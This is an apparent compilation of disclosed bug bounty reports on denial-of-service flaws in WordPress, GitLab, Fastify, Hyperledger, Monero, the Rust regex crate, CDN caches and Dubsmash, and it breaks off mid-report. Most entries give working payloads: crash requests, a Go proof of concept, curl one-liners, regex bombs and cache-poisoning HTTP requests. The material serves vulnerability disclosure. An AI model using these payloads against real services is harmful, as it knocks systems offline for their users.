https://███/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter

███ 

## References

https://hackerone.com/reports/925425
https://hackerone.com/reports/335177

## References

## Impact

Attackers can use this vulnerable function to deplete server resources and launch denial of service attacks.

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Access:
```
https://████████/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
```
After accessing this, the site will load several files at once and will return the loading of these scripts. To launch a DoS attack, just repeat this request several times and the server will be overloaded.

## Suggested Mitigation/Remediation Actions

---

### [DOS via issue preview](https://hackerone.com/reports/1543718)

- **Report ID:** `1543718`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** GitLab
- **Reporter:** @legit-security
- **Bounty:** 7640 usd
- **Disclosed:** 2022-11-04T03:47:01.857Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
Previewing an issue with a specially-crafted description results in high CPU usage for 60 seconds (request timeout).
Multiple requests can be issued in parallel to create a larger impact.

### Steps to reproduce
1. Given an authorized user (on GitLab.com - anyone can self-register. On EE - depends on instance configuration).
2. Create an issue with the following description (provided a one-line python script to avoid bloating):
3. Hit the preview button.

Steps 2&3 can be accomplished via the preview_markdown API endpoint.

The script:
```python -c "print('![l' * int(1048576 / 3 - 1) + '\n')"```
Note: this is essentially the maximal description size, but a smaller number of repetitions works too.

### Impact
After 60 seconds (timeout) - the request fails.
Meanwhile, on the server end, (a single) CPU is burnt out (verified against a local EE instance).
Issuing multiple requests in parallel results in multiple CPUs burn out.
Using the DockerHub image, the entire server is completely unavailable by repeatedly sending a small number of requests repeatedly.

### Examples
The bug is instance-independent, works on latest versions. Since GitLab.com is open-core - it would work on GitLab too.

### What is the current *bug* behavior?
The HTTP request fails for timeout while the server is burning CPU.

On the code side:
```texts_and_contexts``` is being initialized here:

```
def analyze(text, context = {})
      @texts_and_contexts << { text: text, context: context }
    end
```

It is then used at banzai/reference_extractor.rb:
```
def html_documents
      ...
      @html_documents ||= Renderer.cache_collection_render(@texts_and_contexts)
      ...
```

The CPU utilization is found in the execution of ```cache_collection_render```.

### What is the expected *correct* behavior?
Fix the implementation of ```cache_collection_render```.

### Relevant logs and/or screenshots
### Output of checks
#### Results of GitLab environment info

## Impact

A complete denial of service of a GitLab EE instance.
As this vulnerability impacts GitLab.com, we assume that this vulnerability opens the door for a DDOS attack.

**Summary (researcher):**

We are Legit Security, a company building a solution that protects development environments and pipelines from security risks such as software supply-chain attacks and sensitive data exposure.
You can read a bit about us at http://www.legitsecurity.com.

---

### [Deny of service via malicious Content-Type](https://hackerone.com/reports/1715536)

- **Report ID:** `1715536`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Fastify
- **Reporter:** @bitk
- **Bounty:** - usd
- **Disclosed:** 2022-10-10T08:43:25.245Z
- **CVE(s):** CVE-2022-39288

**Vulnerability Information:**

## Summary:

I found a way to crash a fastify@4.6.0  server with a single query on a minimal setup. 


The function `ContentTypeParser.getParser()` do not check properly if the requested content-type parser exists.

/lib/contentTypeParser.js:94
```javascript
ContentTypeParser.prototype.getParser = function (contentType) {
  if (contentType in this.customParsers) {
    return this.customParsers[contentType]
  }

...
```

If an attacker send `constructor` or any default Object attribute, the function will return something unexpected instead of a parser, here the function returns `[Function: Object]`.

Then the `parser.fn` function is called.
/lib/contentTypeParser.js:94
```javascript
    const result = parser.fn(request, request[kRequestPayloadStream], done)
```

Because `parser.fn` is undefined, the application crashes.




## Steps To Reproduce:

I used the code provided in the [documentation](https://www.fastify.io/docs/latest/Guides/Getting-Started/)


index.js
```javascript
const fastify = require('fastify')({
  logger: true
})

// Declare a route
fastify.get('/', function (request, reply) {
  reply.send({ hello: 'world' })
})

// Run the server!
fastify.listen({ port: 3000 }, function (err, address) {
  if (err) {
    fastify.log.error(err)
    process.exit(1)
  }
  // Server is now listening on ${address}
})
```

Start the server:

```
> node index.js
{"level":30,"time":1664375818521,"pid":8587,"hostname":"localhost","msg":"Server listening at http://127.0.0.1:3000"}

```

When the server is ready, send the following POST  request

```
> curl -X POST http://127.0.0.1:3000 -H 'Content-Type: constructor'
curl: (52) Empty reply from server
```

The server had crashed with 

```
TypeError: parser.fn is not a function
```

## Impact

A malicious actor can crash any fastify server as long as they are able to send a `Content-type` header.

---

### [Lack of Packet Sanitation in Goflow Results in Multiple DoS Attack Vectors and Bugs](https://hackerone.com/reports/1636320)

- **Report ID:** `1636320`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @path_network
- **Bounty:** 500 usd
- **Disclosed:** 2022-09-30T11:15:40.510Z
- **CVE(s):** CVE-2022-2529

**Summary (team):**

sflow decode package of the [Goflow](https://github.com/cloudflare/goflow) application did not implement sufficient packet sanitisation which could lead to a denial of service attack. Attackers could craft malformed packets causing the process to consume large amounts of memory resulting in a denial of service.
The issue has been fixed by Cloudflare Engineering team in the 3.4.4 Goflow release.

---

### [DOS validator nodes of blockchain to block external connections](https://hackerone.com/reports/1695472)

- **Report ID:** `1695472`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Linux Foundation Decentralized Trust
- **Reporter:** @cre8
- **Bounty:** 1500 usd
- **Disclosed:** 2022-09-13T07:56:43.496Z
- **CVE(s):** CVE-2022-31006

**Vulnerability Information:**

Attack was documented in the in the github repo: https://github.com/hyperledger/indy-node/security/advisories/GHSA-x996-7qh9-7ff7

# Attack:
The attacker sends 500 read requests to each node and opens a new one when
holding 500 parallel connections. Every user is able to send read requests
since it's a public readable registry so setting up an allowlist like it's
done with the nodes' port for the consensus does not work here. To increase
the efficiency:

the custom read request is increased with more bytes (random header or
json values)
the bandwidth of the sender machine is limited
Requirements on the attacker side:
Indy-VDR: comment out the timeouts. Using another tool to send the requests
could be even more efficient
VM: attack can be performed from one or multiple VMs limited connection: using
TC to limit the bandwidth (value depends on the amount of connections)
Sample Implementation
We set up a VON-Network and added the firewall rules. The VM had 32 CPUs
and 64 GB RAM

# Result:
there is no damage to the blockchain, only an unreachable network as long
as the attack is going on .
Other clients are not able to send read or write requests to the nodes. In
the "best case" their requests will go through but with a response time of
multiple seconds, see:
Not available [image: image.png]

Not available [image: image.png]

# Counteractions:
blacklisting actors: It does not matter what is in the body since the
firewall rule acts in front of indy that is processing the information. To
avoid big requests the firewall could set a limit of the request size, but
this could also block valid requests.
Scaling via the observer-pattern: Right now the amount of nodes is
limited so blocking 25*500 connections is very easy. When adding nodes in
front of the validators to prevent accessing from the internet the
validators are save, but then all the observers are under attack
Scalability: Giving the VMs more CPU and RAM to increase the parallel
connections amount can help in first run, but the DoS attack can be
performed as a DDos. An attacker does not have to DoS the network 24/7, but
can scale up the VMs on demand to attack a specific network. The setup is
done in about 2 minutes automatically. In our test we used 500 as the
limit. Maybe there is some kind of algorithm for the node administrators to
calculate the limit based on their CPU. But in this case the attacker can
also increase his ressources.

## Impact

An attacker can max out the number of client connections allowed by the ledger, leaving the ledger unable to be used for its intended purpose.

However, the ledger content will not be impacted and the ledger will resume servicing client requests after the conclusion of the attack.

---

### [Remote denial of service in HyperLedger Fabric](https://hackerone.com/reports/1635854)

- **Report ID:** `1635854`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Linux Foundation Decentralized Trust
- **Reporter:** @zqgnd
- **Bounty:** - usd
- **Disclosed:** 2022-09-01T14:05:00.956Z
- **CVE(s):** CVE-2022-36023

**Vulnerability Information:**

How to reproduce
1.Bring up the test network.(https://hyperledger-fabric.readthedocs.io/en/latest/test_network.html#bring-up-the-test-network)
2.Run the PoC.
```bash
go run poc.go -server=192.168.0.208:7051
```
```go
package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"

	"github.com/hyperledger/fabric-protos-go/gateway"
	"github.com/hyperledger/fabric-protos-go/peer"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

func main() {

	var srv string
	flag.StringVar(&srv, "server", "localhost:7050", "The RPC server to connect to.")

	flag.Parse()

	config := &tls.Config{
		InsecureSkipVerify: true,
	}

	conn, err := grpc.Dial(srv, grpc.WithTransportCredentials(credentials.NewTLS(config)))
	
	defer func() {
		_ = conn.Close()
	}()

	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}


	payload := &gateway.EvaluateRequest{}


	payload.ProposedTransaction = &peer.SignedProposal{}



	resp, err := gateway.NewGatewayClient(conn).Evaluate(context.TODO(), payload)
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}


	fmt.Println("resp:", resp)

}

```
3.Crash.
```log
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x8 pc=0x157d6c7]

goroutine 381927 [running]:
github.com/hyperledger/fabric/internal/pkg/gateway.getChannelAndChaincodeFromSignedProposal(0x0?)
        /go/src/github.com/hyperledger/fabric/internal/pkg/gateway/apiutils.go:49 +0xe7
github.com/hyperledger/fabric/internal/pkg/gateway.(*Server).Evaluate(0xc0001dd3e0, {0x1b55c58?, 0xc00359aa80}, 0xc003470600)
        /go/src/github.com/hyperledger/fabric/internal/pkg/gateway/api.go:43 +0x85
github.com/hyperledger/fabric-protos-go/gateway._Gateway_Evaluate_Handler.func1({0x1b55c58, 0xc00359aa80}, {0x18ed0a0?, 0xc003470600})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/gateway/gateway.pb.go:1176 +0x78
github.com/hyperledger/fabric/internal/peer/node.unaryGrpcLimiter.func1({0x1b55c58, 0xc00359aa80}, {0x18ed0a0, 0xc003470600}, 0x195a8d5?, 0xc003400210)
        /go/src/github.com/hyperledger/fabric/internal/peer/node/grpc_limiters.go:49 +0x38e
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359aa80?}, {0x18ed0a0?, 0xc003470600?})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a
github.com/hyperledger/fabric/common/grpclogging.UnaryServerInterceptor.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0xc000308420, 0xc000308440)
        /go/src/github.com/hyperledger/fabric/common/grpclogging/server.go:92 +0x305
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359a810?}, {0x18ed0a0?, 0xc003470600?})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a
github.com/hyperledger/fabric/common/grpcmetrics.UnaryServerInterceptor.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0x7f0fb3c94a38?, 0xc000308460)
        /go/src/github.com/hyperledger/fabric/common/grpcmetrics/interceptor.go:31 +0x17b
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359a810?}, {0x18ed0a0?, 0xc003470600?})
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a
github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0xc000521ae0?, 0x17ab820?)
        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:34 +0xbf
github.com/hyperledger/fabric-protos-go/gateway._Gateway_Evaluate_Handler({0x189b040?, 0xc0001dd3e0}, {0x1b55c58, 0xc00359a810}, 0xc0034705a0, 0xc0001f0720)
        /go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/gateway/gateway.pb.go:1178 +0x138
google.golang.org/grpc.(*Server).processUnaryRPC(0xc0006a2e00, {0x1b5a950, 0xc0002f4480}, 0xc00321e100, 0xc00045a780, 0x2398808, 0xc00357a740)
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1180 +0xc8f
google.golang.org/grpc.(*Server).handleStream(0xc0006a2e00, {0x1b5a950, 0xc0002f4480}, 0xc00321e100, 0xc00357a740)
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1503 +0xa1b
google.golang.org/grpc.(*Server).serveStreams.func1.2()
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:843 +0x98
created by google.golang.org/grpc.(*Server).serveStreams.func1
        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:841 +0x28a
```

## Impact

It can easily break down as many peers as the attacker wants.

---

### [RPC call crashes node](https://hackerone.com/reports/1379707)

- **Report ID:** `1379707`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Monero
- **Reporter:** @xfang
- **Bounty:** - usd
- **Disclosed:** 2022-08-20T03:41:29.301Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Passing a large list of amounts to the `get_output_distribution` call crashes a remote node, after maybe 90 seconds of keeping it busy.

## Releases Affected:

  * Probably all

## Steps To Reproduce:
```
values=`echo $(seq 0 500 900000)|sed -e 's/ /,/g'` ; curl http://127.0.0.1:38081/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"get_output_distribution","params":{"amounts": ['$values'], "from_height": 100, "cumulative": false}' -H 'Content-Type: application/json'
```
Reduce the 900000 number a bit and instead of crashing the daemon, it'll do a denial of service, like 90 seconds per call, making it hard for anyone else to use that call.


## Supporting Material/References:

  * Unnecessary. The attack is  straightforward and compelling.

## Housekeeping

Payment address: ████

## Impact

An attacker can crash any remote node that exposes `get_output_distribution` or tie up availability of that function call. I think that's serious.

---

### [Remote denial of service in  HyperLedger Fabric](https://hackerone.com/reports/1604951)

- **Report ID:** `1604951`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Linux Foundation Decentralized Trust
- **Reporter:** @zqgnd
- **Bounty:** - usd
- **Disclosed:** 2022-07-07T11:55:17.311Z
- **CVE(s):** CVE-2022-31121

**Summary (team):**

This issue was caused by [a missing check of nil](https://github.com/hyperledger/fabric/pull/3494).

> An orderer to orderer consensus message that contains an empty inner message crashes the node because it attempts to figure out its type and the mere action of determining the type of a nil pointer, causes a panic.

Thank you to Haosheng Wang of OPPO ZIWU Security Lab for this disclosure.

---

### [Regexes with large repetitions on empty sub-expressions take a very long time to parse](https://hackerone.com/reports/1518036)

- **Report ID:** `1518036`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @addisoncrump
- **Bounty:** 4000 usd
- **Disclosed:** 2022-03-22T22:24:15.254Z
- **CVE(s):** CVE-2022-24713

**Vulnerability Information:**

Rust's regex crate guarantees a linear time complexity with regex length for compilation of untrusted regexes. However, existing mitigations for known malicious regexes are based on memory usage and, as such, do not mitigate repetitions of empty sub-expressions. For example, the following payload triggers such an issue:

```re
(?:){4294967295}
```

This will cause the regex compiler to attempt to create 4294967295 instances of an empty sub-expression, which will ultimately allocate zero bytes and therefore bypass existing memory-based mitigations. This can be further weaponised to create an exponential time complexity with regex length by using repetitions of repetitions, e.g.:

```re
(?:){64}{64}{64}{64}{64}{64}
```

This payload would cause the regex compiler to attempt to create 64^6 instances of an empty sub-expression.

## Impact

An attacker can induce a CPU time-based denial of service with effectively infinite CPU time, which would cause the service to become entirely unavailable.

**Summary (team):**

Security advisory for the regex crate (CVE-2022-24713)
Mar. 8, 2022 · The Rust Security Response WG

The Rust Security Response WG was notified that the regex crate did not properly limit the complexity of the regular expressions (regex) it parses. An attacker could use this security issue to perform a denial of service, by sending a specially crafted regex to a service accepting untrusted regexes. No known vulnerability is present when parsing untrusted input with trusted regexes.

This issue has been assigned CVE-2022-24713. The severity of this vulnerability is "high" when the regex crate is used to parse untrusted regexes. Other uses of the regex crate are not affected by this vulnerability.

Overview
The regex crate features built-in mitigations to prevent denial of service attacks caused by untrusted regexes, or untrusted input matched by trusted regexes. Those (tunable) mitigations already provide sane defaults to prevent attacks. This guarantee is documented and it's considered part of the crate's API.

Unfortunately a bug was discovered in the mitigations designed to prevent untrusted regexes to take an arbitrary amount of time during parsing, and it's possible to craft regexes that bypass such mitigations. This makes it possible to perform denial of service attacks by sending specially crafted regexes to services accepting user-controlled, untrusted regexes.

Affected versions
All versions of the regex crate before or equal to 1.5.4 are affected by this issue. The fix is included starting from regex 1.5.5.

Mitigations
We recommend everyone accepting user-controlled regexes to upgrade immediately to the latest version of the regex crate.

Unfortunately there is no fixed set of problematic regexes, as there are practically infinite regexes that could be crafted to exploit this vulnerability. Because of this, we do not recommend denying known problematic regexes.

Acknowledgements
We want to thank Addison Crump for responsibly disclosing this to us according to the Rust security policy, and for helping review the fix.

We also want to thank Andrew Gallant for developing the fix, and Pietro Albini for coordinating the disclosure and writing this advisory.

https://blog.rust-lang.org/2022/03/08/cve-2022-24713.html

---

### [Cache Poisoning DoS on downloads.exodus.com](https://hackerone.com/reports/1173153)

- **Report ID:** `1173153`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Exodus
- **Reporter:** @youstin
- **Bounty:** - usd
- **Disclosed:** 2021-12-22T23:36:50.416Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello,

The subdomain downloads.exodus.com hosts all files meant to be downloaded by exodus users. A few of the file I found are:

```
https://downloads.exodus.com/releases/exodus-linux-x64-21.4.9.zip
https://downloads.exodus.com/releases/hashes-exodus-21.2.12.txt
https://downloads.exodus.com/releases/exodus-macos-21.3.29.dmg
```

The files are hosted on a azure storage host and are cached by Cloudflare.
A crafted Authorization header causes a 403 on the azure storage host, which is cached by cloudflare and passed to all other users accessing the source. 

### Disclaimer:
No actual denial of service attack was caused troughout my testing. All the testing used cache-busters, meaning it did not affect the live website in any way.

## Steps To Reproduce:

1. Send the following request to poison the cache:
```http
GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1
Host: downloads.exodus.com
Authorization: SharedKeyLite myaccount:ctzMq410TV3wS7upTBcunJTDLEJwMAZuFPfr0mrrA08=  

```
Notice you will get a 403. 

2. The cache is now poisoned so sending a request without the header or visiting the poisoned url in a browser will show you the cached 403. 
```
```http
GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1
Host: downloads.exodus.com

```
Will show the same 403 response. 

## Supporting Material/References:

Video PoC:

████████

## Impact

The steps that were used to take down a reosurce including a random parameter as a cache-buster can also be reproduced on the actual files when their cache is about to expire.  This will cause a DoS, restricting users from downloading or accessing the files hosted on downloads.exodus.com.

**Summary (researcher):**

For more details about the vulnerability, check out:
https://youst.in/posts/cache-poisoning-at-scale/

---

### [Cache poisoning Denial of Service affecting assets.gitlab-static.net](https://hackerone.com/reports/1160407)

- **Report ID:** `1160407`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** GitLab
- **Reporter:** @youstin
- **Bounty:** - usd
- **Disclosed:** 2021-12-22T23:36:26.498Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary

Hi,

Gitlab.com is hosting JS and CSS on `https://assets.gitlab-static.net/` and uses them on gitlab.com/*
The static files seem to be stored on a gcp host, which by default accepts the `x-http-method-override` header. Since the CDN is using Varnish to cache files, I was able to combine the GCP behaviour and poison the cache into returning an empty resource, inherenetly causing a denial of service on gitlab.com and all gitlab assets that use the specific cdn. 

###  Disclaimer

No actual denial of service attack was caused troughout my testing. All the testing used cache-busters, meaning it did not affect the live website in any way.
 
# Steps to reproduce

1. Sending a request such as:

```http
GET /assets/webpack/commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.3f9d44ba.chunk.js HTTP/1.1
Host: assets.gitlab-static.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
Connection: close
```
will return the expected js file. 
By taking a quick look at the response headers, we can see the file is currently cached by varnish because of the following headers:
```http
Age: 498
X-Served-By: cache-dca17752-DCA, cache-osl6520-OSL
X-Cache: HIT, HIT
X-Cache-Hits: 1, 1
```
2. In order to test cache poisoning without affecting the live website, we can add random query parameters that will act as cache busters. In order to poison a resource, an attacker would send the following request:

```http
GET /assets/webpack/commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.3f9d44ba.chunk.js?cb=youstin-xyz HTTP/1.1
Host: assets.gitlab-static.net
x-http-method-override: HEAD
```

This will return an empty response, as it is expected from a `HEAD` request. However since the `x-http-method-override` header is not included in the cache key and the varnish configuration used does not proccess the `x-http-method-override`, this empty response will also be forwarded to all other users requesting the file, with normal GET requests. 

{F1260892}

You can also confirm the cache can be poisoned by visiting the file in your browser, making sure to include the parameter used as a cachebuster. You should notice the empty repsonse, typical to a HEAD request.

This vulnerability can be used on files used by the live site even if they are already cached, by making use of the PURGE http method, which clears the cache, allowing for an easily reproducible DoS attack.

## Impact

Since Gitlab does not forbid unauthorized users from using the PURGE http method, which clears the cache, it is possible for an attacker to clear the cache for actual JS or CSS files used on gitlab.com and poison it with an empty response. Doing so will lead to missing JS and CSS files, making gitlab completely unuseable. 
This vulnerability affects all instances of gitlab where the cdn is used for JS and CSS files.

**Summary (researcher):**

For more details about the vulnerability, check out:
https://youst.in/posts/cache-poisoning-at-scale/

---

### [[dubsmash] Long String in 'shoutout' Parameter Leading Internal server Error on Popular hastags , Community and User Profile](https://hackerone.com/reports/1237428)

- **Report ID:** `1237428`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Reddit
- **Reporter:** @sandeep_rj49
- **Bounty:** - usd
- **Disclosed:** 2021-12-13T22:48:03.944Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
If the user input a long string in the 'shoutout' parameter of the 'CreateVideo' API then all the APIs where this video is supposed to appear (eg: hashtag API, community API, and user profile API) will throw 'internal server error' in the response. This will cause a denial of service attack for the hashtag API (if hashtags are used in the video), community API (if the video is uploaded in the community), and user profile API.

So, if the attacker uses all trending hashtags in the video then all other videos from the trending hashtags will disappear and API will respond with 200 OK HTTP status code but 'INTERNAL_SERVER_ERROR' in the response body. The hashtag activity tab will not display any other videos.

## Steps To Reproduce:
1. Open dubsmash ios app. 
2. Record any video. 
3. Use any hashtag in the description (use trending hashtags to cause a denial of service on the trending hashtags).
4. Click on the post button and intercept the vulnerable request in the burp suite.
5. Input any long string in the 'shoutout' parameter value. Example- 74692d5f38a34cb4b355cef784fe46aa
6. Forward the request to the server and turn off the intercept.
7. On the screen, if it is showing video not uploaded then click. on upload again. 
8. Wait for few minutes to reflect the video in the hashtag. 
9. Search for the used hashtag. 
10. You'll see your video thumbnail is appearing for the searched hashtag. But when you open a hashtag for accessing all the videos, it is not reflecting any API. 
11. Capture the TagUGC API, it will reflect "INTERNAL SERVER ERROR" in the response. 


## AFFECTED API:
hashtag API:
```
POST /graphql?build_number=52430&platform=ios HTTP/2
Host: gateway-production.dubsmash.com
Content-Type: application/json
X-Device-Country: IN
Accept: application/json
Authorization: Bearer xxxxxx
X-Dubsmash-Device-Id: 8F15E960-B1C5-4C30-A100-CA0527827502
X-Accept-Content-Language: en_IN
Accept-Language: en-IN;q=1.0, hi-IN;q=0.9
Accept-Encoding: gzip, deflate
If-None-Match: W/"697-EM383iY/+yqkrvx/lSeRoGMBjWM"
X-Device-Language: en
X-Build-Number: 52430
X-Device-Timezone: 19800
X-App-Version: 6.3.0
X-Remote-Config-Values: []
User-Agent: Dopesmash/6.3.0 (com.mobilemotion.dubsmash; build:52430; iOS 14.0.1) Alamofire/5.4.1
Content-Length: 4737
Connection: close

